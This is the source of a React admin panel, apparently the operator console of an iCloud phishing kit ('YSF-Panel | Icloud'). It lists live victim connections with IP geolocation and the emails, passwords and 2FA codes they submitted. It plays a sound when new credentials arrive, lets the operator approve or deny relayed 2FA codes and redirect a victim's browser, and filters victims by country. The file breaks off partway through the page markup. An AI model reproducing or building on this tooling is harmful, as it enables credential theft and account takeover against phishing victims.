'use client';

import { useState, useEffect, useMemo, useRef } from 'react';
import {
    RefreshCw,
    ChevronLeft,
    ChevronRight,
    ChevronDown,
    Globe,
    MapPin,
    Clock,
    Wifi,
    Smartphone,
    Flag,
    AlertCircle,
    Shield,
    User,
    Lock,
    Copy,
    ExternalLink,
    Globe2,
    MapPinOff,
    Building,
    Mail,
    Calendar,
    Info,
    Server,
    Network,
    Hash,
    LayoutDashboard,
    Users,
    Activity,
    Bell,
    Key,
    Tag,
    Terminal,
    UserCircle,
    Settings,
    LogOut,
    Menu,
    X,
    Eye,
    EyeOff,
    Trash2,
    CheckCircle,
    XCircle,
    Plus,
    Minus,
    History,
    CircleCheckIcon
} from 'lucide-react';
import io from 'socket.io-client';
import {
    Sheet,
    SheetClose,
    SheetContent,
    SheetDescription,
    SheetFooter,
    SheetHeader,
    SheetTitle,
    SheetTrigger,
} from "@/components/ui/sheet";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Field, FieldLabel } from "@/components/ui/field";
import { HistoryDataGrid } from "@/components/history/HistoryDataGrid";
import { Alert, AlertDescription, AlertTitle } from "@/components/reui/alert";
import { Status, StatusIndicator, StatusLabel } from "@/components/ui/status";

// European country codes (ISO 3166-1 alpha-2) for GeoIP "Europe" region
const EUROPE_COUNTRY_CODES = new Set(['AL', 'AD', 'AT', 'BY', 'BE', 'BA', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'GR', 'HU', 'IS', 'IE', 'IT', 'XK', 'LV', 'LI', 'LT', 'LU', 'MT', 'MD', 'MC', 'ME', 'NL', 'MK', 'NO', 'PL', 'PT', 'RO', 'RU', 'SM', 'RS', 'SK', 'SI', 'ES', 'SE', 'CH', 'UA', 'GB', 'VA']);
const EUROPE_COUNTRY_LIST = [...EUROPE_COUNTRY_CODES].sort();
const EUROPE_COUNTRY_NAMES = { AD: 'Andorra', AL: 'Albania', AT: 'Austria', BA: 'Bosnia and Herzegovina', BE: 'Belgium', BG: 'Bulgaria', BY: 'Belarus', CH: 'Switzerland', CY: 'Cyprus', CZ: 'Czech Republic', DE: 'Germany', DK: 'Denmark', EE: 'Estonia', ES: 'Spain', FI: 'Finland', FR: 'France', GB: 'United Kingdom', GR: 'Greece', HR: 'Croatia', HU: 'Hungary', IE: 'Ireland', IS: 'Iceland', IT: 'Italy', LI: 'Liechtenstein', LT: 'Lithuania', LU: 'Luxembourg', LV: 'Latvia', MC: 'Monaco', MD: 'Moldova', ME: 'Montenegro', MK: 'North Macedonia', MT: 'Malta', NL: 'Netherlands', NO: 'Norway', PL: 'Poland', PT: 'Portugal', RO: 'Romania', RS: 'Serbia', RU: 'Russia', SE: 'Sweden', SI: 'Slovenia', SK: 'Slovakia', SM: 'San Marino', UA: 'Ukraine', VA: 'Vatican City', XK: 'Kosovo' };

const GEOIP_REGIONS = [
    { id: 'US', label: 'USA', flagCode: 'US' },
    { id: 'CA', label: 'Canada', flagCode: 'CA' },
    { id: 'EU', label: 'Europe' },
];

export default function Panel() {
    const [socket, setSocket] = useState(null);
    const [connections, setConnections] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [authError, setAuthError] = useState(null);
    const [currentPage, setCurrentPage] = useState(1);
    const [itemsPerPage, setItemsPerPage] = useState(20);
    const [searchTerm, setSearchTerm] = useState('');
    const [sortBy, setSortBy] = useState('connectedAt');
    const [sortOrder, setSortOrder] = useState('desc');
    const [lastUpdated, setLastUpdated] = useState(null);
    const [isAdmin, setIsAdmin] = useState(false);
    const [socketId, setSocketId] = useState(null);
    const [redirectUrl, setRedirectUrl] = useState('');
    const [selectedRedirectPage, setSelectedRedirectPage] = useState('');
    const [stats, setStats] = useState({
        total: 0,
        adminCount: 0,
        userCount: 0
    });
    const [selectedConnection, setSelectedConnection] = useState(null);
    const [activeTab, setActiveTab] = useState('connections');
    const [sidebarOpen, setSidebarOpen] = useState(false);
    const [activeNav, setActiveNav] = useState('connections');
    const [show2FANotification, setShow2FANotification] = useState(false);
    const [notificationExiting, setNotificationExiting] = useState(false);
    const prev2FANotificationIdsRef = useRef(new Set());
    const [geoipAllowedRegions, setGeoipAllowedRegions] = useState(() => {
        if (typeof window === 'undefined') return [];
        try {
            const s = localStorage.getItem('geoipAllowedRegions');
            return s ? JSON.parse(s) : [];
        } catch { return []; }
    });
    const [europeApproved, setEuropeApproved] = useState(() => {
        if (typeof window === 'undefined') return [];
        try {
            const s = localStorage.getItem('geoipEuropeApproved');
            return s ? JSON.parse(s) : [];
        } catch { return []; }
    });
    const [europeBlocked, setEuropeBlocked] = useState(() => {
        if (typeof window === 'undefined') return [];
        try {
            const s = localStorage.getItem('geoipEuropeBlocked');
            return s ? JSON.parse(s) : [];
        } catch { return []; }
    });
    const [europeSelect, setEuropeSelect] = useState('');
    const [europeConfigOpen, setEuropeConfigOpen] = useState(false);
    const [selectedUser, setSelectedUser] = useState(null);
    const [sectionsOpen, setSectionsOpen] = useState({
        basic: true,
        location: true,
        control: true,
        credentials: true,
        timing: true
    });
    const [credentialStatus, setCredentialStatus] = useState({});
    const [copiedField, setCopiedField] = useState(null);
    const [redirectPageSent, setRedirectPageSent] = useState(false);
    const [redirectUrlSent, setRedirectUrlSent] = useState(false);
    const [connectionToDelete, setConnectionToDelete] = useState(null);
    const [connectionHistory, setConnectionHistory] = useState([]);
    const [historyLoading, setHistoryLoading] = useState(false);
    const copyToClipboard = (text, field) => {
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            setCopiedField(field);
            setTimeout(() => setCopiedField(null), 1500);
        });
    };
    const prevConnectionsRef = useRef([])
    const hasInitiallyLoaded = useRef(false)
    const prevLoginDataRef = useRef(new Set())
    const prev2FARef = useRef(new Set())

    const getCredentialStatus = (connId) => credentialStatus[connId] || { login: 'pending', twoFA: 'waiting' };
    const setLoginStatus = (connId, status, loginSnapshot) => setCredentialStatus(prev => ({
        ...prev,
        [connId]: { ...(prev[connId] || {}), login: status, loginVersion: status !== 'pending' && loginSnapshot ? JSON.stringify({ e: loginSnapshot.email, p: loginSnapshot.password }) : undefined }
    }));
    const setTwoFAStatus = (connId, status, codeSnapshot) => setCredentialStatus(prev => ({
        ...prev,
        [connId]: { ...(prev[connId] || {}), twoFA: status, twoFAVersion: status !== 'pending' ? codeSnapshot : undefined }
    }));
    const loginDataVersion = selectedConnection?.loginData ? JSON.stringify({ e: selectedConnection.loginData.email, p: selectedConnection.loginData.password }) : '';
    const twoFAVersion = selectedConnection?.loginData?.twoFactorCode ?? '';

    const handleRedirectPage = (socketId, page) => {
        if (socket && socketId && page) {
            socket.emit("redirectPage", {
                socketId: socketId,
                page: page
            });
        }
    };

    useEffect(() => {
        if (!socket || !socket.connected || !isAdmin) return;

        const interval = setInterval(() => {
            fetchConnections();
        }, 2000);

        return () => clearInterval(interval);
    }, [socket, isAdmin]);

    const getToken = () => {
        if (typeof window !== 'undefined') {
            return localStorage.getItem('adminToken');
        }
        return null;
    };

    useEffect(() => {
        const token = getToken();

        if (!token) {
            setAuthError('No admin token found. Please login.');
            setLoading(false);
            return;
        }

        console.log('🔌 Connecting to socket server with token...');

        const socketConnection = io('http://localhost:3005', {
            auth: {
                token: token
            },
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 5
        });

        socketConnection.on('connect', () => {
            console.log('Socket connected:', socketConnection.id);
            setSocketId(socketConnection.id);
            setAuthError(null);
        });

        socketConnection.on('welcome', (data) => {
            console.log('Welcome from server:', data);
            setIsAdmin(data.isAdmin || false);

            if (!data.isAdmin) {
                localStorage.removeItem('adminToken');
                setAuthError('Session expired or invalid. Please log in again.');
            }
        });

        socketConnection.on('connect_error', (error) => {
            console.log('Socket connection error:', error.message);
            setAuthError(`Connection failed: ${error.message}`);
            setLoading(false);
        });

        socketConnection.on('disconnect', (reason) => {
            console.log('Socket disconnected:', reason);
            setSocketId(null);
        });

        setSocket(socketConnection);

        return () => {
            console.log('Cleaning up socket connection');
            if (socketConnection) {
                socketConnection.disconnect();
            }
        };
    }, []);

    const playNotificationSound = () => {
        const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIGGS57OihUBELTKXh8K1hGgg=' );
        audio.volume = 0.5;
        audio.play().catch(e => console.log('Audio play failed:', e));
    };

    const fetchConnections = (isManual = false) => {
        if (!socket || !socket.connected) {
            setError('Socket not connected');
            return;
        }

        if (!isAdmin) {
            setError('Admin access required');
            return;
        }

        if (!hasInitiallyLoaded.current || isManual) {
            setLoading(true);
        }
        setError(null);

        socket.emit('getAll', (response) => {
            if (!hasInitiallyLoaded.current || isManual) {
                setLoading(false);
                hasInitiallyLoaded.current = true;
            }

            if (response.success) {
                setConnections(prev => {
                    const updated = response.connections.map(newConn => {
                        const existing = prev.find(c => c.id === newConn.id)
                        
                        // Check for new login data
                        if (newConn.loginData && !prevLoginDataRef.current.has(newConn.id)) {
                            prevLoginDataRef.current.add(newConn.id);
                            playNotificationSound();
                        }
                        if (newConn.loginData?.twoFactorCode && !prev2FARef.current.has(newConn.id)) {
                            prev2FARef.current.add(newConn.id);
                            playNotificationSound();
                        }
                        return existing ? { ...existing, ...newConn, isActive: true } : newConn;
                    });

                    const removed = prev.filter(prevConn =>
                        !response.connections.find(c => c.id === prevConn.id)
                    ).map(conn => ({ ...conn, isActive: false }))

                    return [...updated, ...removed]
                });

                setSelectedConnection(prev => {
                    if (!prev) return null;
                    const freshData = response.connections.find(c => c.id === prev.id);
                    if (freshData) {
                        return { ...prev, ...freshData, isActive: true };
                    }
                    return { ...prev, isActive: false };
                });

                setStats({
                    total: response.total,
                    adminCount: response.adminCount,
                    userCount: response.connections.length
                });
                setLastUpdated(response.timestamp);
            } else {
                setError(response.error || 'Failed to fetch connections');
            }
        });
    };

    useEffect(() => {
        if (socket && socket.connected && isAdmin) {
            fetchConnections();
        }
    }, [socket, isAdmin]);

    useEffect(() => {
        const idsWith2FA = new Set(
            connections.filter(c => c.loginData?.twoFactorCode).map(c => c.id)
        );
        if (idsWith2FA.size === 0) return;
        const prev = prev2FANotificationIdsRef.current;
        const hasNew = [...idsWith2FA].some(id => !prev.has(id));
        if (hasNew) {
            idsWith2FA.forEach(id => prev.add(id));
            setNotificationExiting(false);
            setShow2FANotification(true);
            const t = setTimeout(() => setNotificationExiting(true), 3000);
            return () => clearTimeout(t);
        }
    }, [connections]);

    // Auto-close toast 1s after code is approved or denied (no connections have 2FA anymore)
    useEffect(() => {
        if (!show2FANotification) return;
        const hasAny2FA = connections.some(c => c.loginData?.twoFactorCode);
        if (!hasAny2FA) {
            const t = setTimeout(() => setNotificationExiting(true), 1000);
            return () => clearTimeout(t);
        }
    }, [show2FANotification, connections]);

    // After exit animation finishes, hide the toast
    useEffect(() => {
        if (!notificationExiting) return;
        const t = setTimeout(() => {
            setShow2FANotification(false);
            setNotificationExiting(false);
        }, 280);
        return () => clearTimeout(t);
    }, [notificationExiting]);

    useEffect(() => {
        try {
            localStorage.setItem('geoipAllowedRegions', JSON.stringify(geoipAllowedRegions));
        } catch (_) {}
    }, [geoipAllowedRegions]);
    useEffect(() => {
        try {
            localStorage.setItem('geoipEuropeApproved', JSON.stringify(europeApproved));
        } catch (_) {}
    }, [europeApproved]);
    useEffect(() => {
        try {
            localStorage.setItem('geoipEuropeBlocked', JSON.stringify(europeBlocked));
        } catch (_) {}
    }, [europeBlocked]);

    useEffect(() => {
        if (activeNav !== 'history') return;
        const token = typeof window !== 'undefined' ? localStorage.getItem('adminToken') : null;
        if (!token) return;
        setHistoryLoading(true);
        fetch('/api/admin/history', { headers: { Authorization: `Bearer ${token}` } })
            .then(res => res.json())
            .then(data => setConnectionHistory(Array.isArray(data.history) ? data.history : []))
            .catch(() => setConnectionHistory([]))
            .finally(() => setHistoryLoading(false));
    }, [activeNav]);

    const filteredConnections = useMemo(() => {
        let filtered = [...connections];
        if (geoipAllowedRegions.length > 0) {
            filtered = filtered.filter(conn => {
                const cc = (conn.geoData?.country || '').toUpperCase().trim();
                if (!cc) return false;
                return geoipAllowedRegions.some(region => {
                    if (region === 'US') return cc === 'US';
                    if (region === 'CA') return cc === 'CA';
                    if (region === 'EU') {
                        if (europeBlocked.includes(cc)) return false;
                        if (europeApproved.length > 0) return europeApproved.includes(cc);
                        return EUROPE_COUNTRY_CODES.has(cc);
                    }
                    return false;
                });
            });
        }
        if (searchTerm) {
            const term = searchTerm.toLowerCase();
            filtered = filtered.filter(conn =>
                conn.id?.toLowerCase().includes(term) ||
                conn.userAgent?.toLowerCase().includes(term) ||
                conn.geoData?.ip?.toLowerCase().includes(term) ||
                conn.geoData?.city?.toLowerCase().includes(term) ||
                conn.geoData?.country?.toLowerCase().includes(term) ||
                conn.geoData?.org?.toLowerCase().includes(term)
            );
        }

        filtered.sort((a, b) => {
            let aValue, bValue;

            if (sortBy === 'connectedAt') {
                aValue = a.connectedAt || 0;
                bValue = b.connectedAt || 0;
            } else if (sortBy === 'country') {
                aValue = a.geoData?.country || '';
                bValue = b.geoData?.country || '';
            } else if (sortBy === 'city') {
                aValue = a.geoData?.city || '';
                bValue = b.geoData?.city || '';
            } else if (sortBy === 'ip') {
                aValue = a.geoData?.ip || '';
                bValue = b.geoData?.ip || '';
            } else {
                aValue = a[sortBy] || '';
                bValue = b[sortBy] || '';
            }

            if (sortOrder === 'asc') {
                return aValue > bValue ? 1 : -1;
            } else {
                return aValue < bValue ? 1 : -1;
            }
        });

        return filtered;
    }, [connections, searchTerm, sortBy, sortOrder, geoipAllowedRegions, europeApproved, europeBlocked]);

    // Pagination calculations
    const totalPages = Math.ceil(filteredConnections.length / itemsPerPage);
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const paginatedConnections = filteredConnections.slice(startIndex, endIndex);

    // Format date
    const formatDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleTimeString([], {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    };

    // Format full date
    const formatFullDate = (timestamp) => {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleString();
    };

    // Get flag emoji from country code
    const getFlagEmoji = (countryCode) => {
        if (!countryCode || countryCode.length !== 2) return '🏴';
        return `https://flagsapi.com/${countryCode.toUpperCase()}/shiny/64.png`;
    };

    // Format time ago
    const formatTimeAgo = (timestamp) => {
        if (!timestamp) return '';
        const seconds = Math.floor((Date.now() - timestamp) / 1000);

        if (seconds < 60) return `${seconds}s ago`;
        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
        return `${Math.floor(seconds / 86400)}d ago`;
    };

    // Handle sort
    const handleSort = (column) => {
        if (sortBy === column) {
            setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc');
        } else {
            setSortBy(column);
            setSortOrder('asc');
        }
        setCurrentPage(1);
    };

    // Render sort indicator
    const renderSortIndicator = (column) => {
        if (sortBy !== column) return null;
        return (
            <ChevronDown
                className={`inline ml-1 w-4 h-4 transition-transform ${sortOrder === 'desc' ? 'rotate-180' : ''
                    }`}
            />
        );
    };

    // Handle login redirect
    const handleLoginRedirect = () => {
        window.location.href = '/icloudadmin';
    };

    // Handle logout
    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        window.location.reload();
    };

    // Open in new tab
    const openInNewTab = (url) => {
        window.open(url, '_blank', 'noopener,noreferrer');
    };

    // Handle sheet open
    const handleSheetOpen = (connection) => {
        setSelectedConnection(connection);
    };

    // Get coordinates link
    const getCoordinatesLink = (loc) => {
        if (!loc) return '#';
        const [lat, lng] = loc.split(',');
        return `https://maps.google.com/?q=${lat},${lng}`;
    };

    // Get IP info link
    const getIPInfoLink = (ip) => {
        if (!ip || ip === 'N/A') return '#';
        return `https://ipinfo.io/${ip}`;
    };

    if (authError) {
        return (
            <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
                <div className="max-w-md w-full bg-[#1C1C1E] border border-[#2C2C2E] rounded p-8 text-center">
                    <Lock className="w-16 h-16 text-red-500 mx-auto mb-4" strokeWidth={1.5} />
                    <h2 className="text-2xl font-semibold text-white mb-2">Authentication Required</h2>
                    <p className="text-gray-400 text-sm mb-6">{authError}</p>
                    <div className="flex gap-3">
                        <button
                            onClick={handleLoginRedirect}
                            className="flex-1 py-2.5 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded transition-colors"
                        >
                            Go to Login
                        </button>
                        <button
                            onClick={() => window.location.reload()}
                            className="flex-1 py-2.5 bg-[#28282A] hover:bg-[#2C2C2E] text-gray-300 font-medium rounded transition-colors"
                        >
                            Retry
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="flex h-screen bg-[#0a0a0a] overflow-hidden">
            {/* Delete confirmation modal */}
            {connectionToDelete && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 p-4" onClick={() => setConnectionToDelete(null)}>
                    <div
                        className="bg-[#0a0a0a] border border-[#2C2C2E] rounded-lg shadow-xl max-w-sm w-full overflow-hidden"
                        onClick={(e) => e.stopPropagation()}
                    >
                        <div className="px-5 pt-5 pb-2">
                            <p className="text-white font-mono text-xs uppercase tracking-widest font-bold text-[#e0e0e0]">
                                YSF-PANEL SAYS
                            </p>
                        </div>
                        <div className="px-5 pb-5">
                            <p className="text-white text-base mb-5">Delete this connection?</p>
                            <div className="flex justify-end gap-2">
                                <button
                                    onClick={() => setConnectionToDelete(null)}
                                    className="px-5 py-2 rounded border border-[#5a5a5a] bg-[#696969] text-white text-sm font-medium hover:bg-[#5a5a5a] transition-colors"
                                >
                                    Cancel
                                </button>
                                <button
                                    onClick={() => {
                                        if (socket && connectionToDelete) {
                                            socket.emit('delete', { ids: [connectionToDelete.id] });
                                            setConnections(prev => prev.filter(c => c.id !== connectionToDelete.id));
                                            setConnectionToDelete(null);
                                        }
                                    }}
                                    className="px-5 py-2 rounded border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 text-sm font-medium transition-colors"
                                >
                                    OK
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Mobile sidebar backdrop */}
            {sidebarOpen && (
                <div
                    className="fixed inset-0 bg-black/50 z-40 lg:hidden"
                    onClick={() => setSidebarOpen(false)}
                />
            )}

            {/* Sidebar */}
            <aside className={`fixed inset-y-0 left-0 z-50 w-56 bg-[#0a0a0a] border-r border-[#2C2C2E] transform transition-transform duration-300 lg:translate-x-0 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'
                } lg:static flex flex-col`}>
                <div className="flex flex-col h-full overflow-y-auto scrollbar-thin">
                    {/* Logo - tab branding */}
                    <div className="px-4 py-4 flex items-center gap-3">
                        <img src="/adminlogo.png" alt="" className="h-8 w-8 object-contain shrink-0" />
                        <span className="text-sm font-semibold text-white">YSF-Panel | Icloud</span>
                    </div>

                    {/* Navigation - Mira: small radius, subtle accent */}
                    <nav className="flex-1 px-2 py-2 space-y-1">
                        <button
                            type="button"
                            onClick={() => setActiveNav('connections')}
                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'connections' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
                        >
                            <Users className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>Connections</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveNav('history')}
                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'history' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
                        >
                            <History className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>History</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveNav('settings')}
                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'settings' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
                        >
                            <Settings className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>Settings</span>
                        </button>
                    </nav>

                    {/* Bottom Actions */}
                    <div className="px-2 py-2 space-y-1 mt-auto">
                        <button
                            onClick={handleLogout}
                            className="w-full flex items-center gap-3 px-3 py-2 text-red-400 hover:text-red-300 hover:bg-[#1f1f1f] rounded-sm text-sm font-medium transition-all duration-150"
                        >
                            <LogOut className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                            <span>Logout</span>
                        </button>
                    </div>
                </div>
            </aside>

            {/* Main Content */}
            <main className="flex-1 overflow-auto bg-[#0a0a0a]">
                {/* Header */}
                <div className="bg-[#0a0a0a] px-4 sm:px-6 lg:px-8 py-3.5">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            {/* Mobile menu button */}
                            <button
                                onClick={() => setSidebarOpen(!sidebarOpen)}
                                className="lg:hidden p-2 text-gray-400 hover:text-white rounded hover:bg-[#181818]"
                            >
                                <Menu className="w-5 h-5" />
                            </button>

                        </div>

                        <div className="flex items-center gap-3">
                            {/* Connection status */}
                            <Status variant={socketId ? 'success' : 'error'} className="px-3 py-1.5">
                                <StatusIndicator />
                                <StatusLabel>{socketId ? 'Connected' : 'Disconnected'}</StatusLabel>
                            </Status>

                            {/* Refresh button */}
                            <button
                                onClick={() => fetchConnections(true)}
                                disabled={loading || !socket?.connected}
                                className="px-4 py-2 bg-transparent text-gray-300 hover:bg-white/10 hover:text-white rounded-sm text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                            >
                                <RefreshCw className={`w-4 h-4 text-[#f0b100] ${loading ? 'animate-spin' : ''}`} strokeWidth={2} />
                                Refresh
                            </button>
                        </div>
                    </div>
                </div>

                {/* 2FA toast notification (floating, 3s or close button or 1s after approve/deny) */}
                {show2FANotification && (
                    <div className="fixed right-4 top-20 z-50 w-full max-w-[380px]">
                        <div className={`notification-popup rounded-lg shadow-xl shadow-black/50 pointer-events-auto relative ${notificationExiting ? 'notification-exiting' : ''}`}>
                            <button
                                type="button"
                                onClick={() => setNotificationExiting(true)}
                                className="absolute right-2 top-2 z-10 p-1.5 rounded-md text-gray-400 hover:text-white hover:bg-white/10 transition-colors cursor-pointer touch-manipulation"
                                aria-label="Close notification"
                            >
                                <X className="size-4 pointer-events-none" strokeWidth={2} />
                            </button>
                            <Alert variant="success" className="w-full py-2.5 px-3 pr-8">
                                <CircleCheckIcon className="shrink-0 size-4" />
                                <div className="min-w-0">
                                    <AlertTitle className="text-white font-semibold text-sm">2FA code received</AlertTitle>
                                    <AlertDescription className="text-gray-400 text-xs mt-0.5 leading-snug">
                                        A connection submitted a verification code. Open it to approve or deny.
                                    </AlertDescription>
                                </div>
                            </Alert>
                        </div>
                    </div>
                )}

                {/* Content Area */}
                <div className="p-4 sm:px-6 lg:px-8 lg:py-6">
                    {activeNav === 'settings' ? (
                        <>
                            <h1 className="text-3xl font-semibold text-white">Settings</h1>
                            <nav className="flex pt-2 pb-10">
                                <div className="flex items-center gap-2 text-sm text-gray-400">
                                    <button type="button" onClick={() => setActiveNav('connections')} className="hover:text-[#f0b100] transition-colors">Connections</button>
                                    <ChevronRight className="w-3 h-3 text-[#f0b100]" />
                                    <span className="text-white">Settings</span>
                                </div>
                            </nav>
                            <div>
                                <p className="text-xs text-gray-500 mb-1">Allow regions</p>
                                <p className="text-xs text-gray-500 mb-2 flex items-center gap-1">
                                    <Info className="w-3.5 h-3.5 text-[#f0b100]" strokeWidth={2} />
                                    Leave all unselected to allow worldwide.
                                </p>
                                <div className="flex flex-wrap items-start gap-3">
                                    {GEOIP_REGIONS.filter(r => r.id !== 'EU').map(region => {
                                        const isOn = geoipAllowedRegions.includes(region.id);
                                        return (
                                            <button
                                                key={region.id}
                                                type="button"
                                                onClick={() => setGeoipAllowedRegions(prev => isOn ? prev.filter(r => r !== region.id) : [...prev, region.id])}
                                                className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded border text-xs font-medium transition-colors ${isOn ? 'bg-[#f0b100]/10 border-[#f0b100] text-[#f0b100]' : 'border-[#2C2C2E] text-gray-400 hover:text-gray-300'}`}
                                            >
                                                <img src={getFlagEmoji(region.flagCode)} alt="" className="w-4 h-4 rounded object-cover" />
                                                <span>{region.label}</span>
                                            </button>
                                        );
                                    })}
                                    <button
                                        type="button"
                                        onClick={() => setGeoipAllowedRegions(prev => prev.includes('EU') ? prev.filter(r => r !== 'EU') : [...prev, 'EU'])}
                                        className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded border text-xs font-medium transition-colors ${geoipAllowedRegions.includes('EU') ? 'bg-[#f0b100]/10 border-[#f0b100] text-[#f0b100]' : 'border-[#2C2C2E] text-gray-400 hover:text-gray-300'}`}
                                    >
                                        <span>Europe</span>
                                    </button>
                                    {geoipAllowedRegions.includes('EU') && (
                                        <div className="flex items-start gap-0">
                                            {!europeConfigOpen ? (
                                                <button
                                                    type="button"
                                                    onClick={() => setEuropeConfigOpen(true)}
                                                    className="border border-[#2C2C2E] rounded px-2 py-1.5 text-[10px] text-gray-400 hover:text-[#f0b100] hover:border-[#f0b100]/50 transition-colors flex items-center gap-1"
                                                >
                                                    <span>Europe</span>
                                                    <ChevronRight className="w-3 h-3" />
                                                </button>
                                            ) : (
                                                <div className="border border-[#2C2C2E] rounded px-3 py-2 flex items-start gap-3 ml-0">
                                                    <button type="button" onClick={() => setEuropeConfigOpen(false)} className="self-center p-1 rounded hover:bg-[#28282A] text-gray-400 hover:text-white" title="Close"><ChevronRight className="w-3 h-3 rotate-180" /></button>
                                                    <div className="space-y-2">
                                                        <div className="flex items-center gap-1.5">
                                                            <select
                                                                value={europeSelect}
                                                                onChange={(e) => setEuropeSelect(e.target.value)}
                                                                className="bg-[#0a0a0a] border border-[#2C2C2E] rounded px-2 py-1 text-[10px] text-gray-300 focus:outline-none input-coolify"
                                                            >
                                                                <option value="">...</option>
                                                                {EUROPE_COUNTRY_LIST.map(code => (
                                                                    <option key={code} value={code}>{code} ({EUROPE_COUNTRY_NAMES[code] || code})</option>
                                                                ))}
                                                            </select>
                                                            <button type="button" onClick={() => { if (europeSelect) { setEuropeApproved(prev => prev.includes(europeSelect) ? prev : [...prev, europeSelect]); setEuropeBlocked(prev => prev.filter(c => c !== europeSelect)); setEuropeSelect(''); } }} className="p-1 rounded border border-green-500/50 text-green-500 hover:bg-green-500/10" title="Approve"><Plus className="w-3 h-3" /></button>
                                                            <button type="button" onClick={() => { if (europeSelect) { setEuropeBlocked(prev => prev.includes(europeSelect) ? prev : [...prev, europeSelect]); setEuropeApproved(prev => prev.filter(c => c !== europeSelect)); setEuropeSelect(''); } }} className="p-1 rounded border border-red-500/50 text-red-500 hover:bg-red-500/10" title="Block"><Minus className="w-3 h-3" /></button>
                                                        </div>
                                                        <div className="grid grid-cols-2 gap-3 text-[10px]">
                                                            <div>
                                                                <p className="text-gray-500 uppercase tracking-wider mb-1">Approved</p>
                                                                <div className="flex flex-wrap gap-2">
                                                                    {europeApproved.length ? europeApproved.map(code => (
                                                                        <span key={code} className="inline-flex items-center gap-1">
                                                                            <img src={getFlagEmoji(code)} alt="" className="w-4 h-4 rounded object-cover shrink-0" />
                                                                            <span className="text-gray-300">{code} ({EUROPE_COUNTRY_NAMES[code] || code})</span>
                                                                        </span>
                                                                    )) : <span className="text-gray-600">—</span>}
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <p className="text-gray-500 uppercase tracking-wider mb-1">Blocked</p>
                                                                <div className="flex flex-wrap gap-2">
                                                                    {europeBlocked.length ? europeBlocked.map(code => (
                                                                        <span key={code} className="inline-flex items-center gap-1">
                                                                            <img src={getFlagEmoji(code)} alt="" className="w-4 h-4 rounded object-cover shrink-0" />
                                                                            <span className="text-gray-300">{code} ({EUROPE_COUNTRY_NAMES[code] || code})</span>
                                                                        </span>
                                                                    )) : <span className="text-gray-600">—</span>}
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    )}
                                </div>
                            </div>
                        </>
                    ) : activeNav === 'history' ? (
                        <>
                            <h1 className="text-3xl font-semibold text-white">History</h1>
                            <nav className="flex pt-2 pb-10">
                                <div className="flex items-center gap-2 text-sm text-gray-400">
                                    <button type="button" onClick={() => setActiveNav('connections')} className="hover:text-[#f0b100] transition-colors">Connections</button>
                                    <ChevronRight className="w-3 h-3 text-[#f0b100]" />
                                    <span className="text-white">History</span>
                                </div>
                            </nav>
                            <p className="text-xs text-gray-500 mb-3">Past connections. Entries can be deleted only via MongoDB.</p>
                            {connectionHistory.length === 0 && !historyLoading && (
                                <p className="text-gray-500 py-4">No history yet. Disconnected connections are saved here.</p>
                            )}
                            <div className="history-grid-theme dark">
                                <HistoryDataGrid data={connectionHistory} loading={historyLoading} />
                            </div>
                        </>
                    ) : (
                        <>
                    {/* Page Title */}
                    <h1 className="text-3xl font-semibold text-white mb-4">Activity</h1>

                    {/* Breadcrumb Navigation */}
                    <nav className="flex pt-2 pb-10">
                        <div className="flex items-center gap-3 text-sm">
